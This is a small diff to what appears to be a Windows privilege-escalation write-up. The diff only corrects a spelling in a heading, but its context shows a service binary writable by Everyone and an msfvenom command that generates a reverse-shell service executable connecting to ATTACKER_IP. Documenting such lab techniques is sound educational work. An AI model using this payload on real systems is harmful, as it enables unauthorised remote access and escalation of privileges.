@@ -41,7 +41,7 @@ C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
 <br/>
 <br/>
 
-- Generating and Transfering the **PAYLOAD**
+- Generating and Transferring the **PAYLOAD**
 
 ```js
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o rev-svc.exe
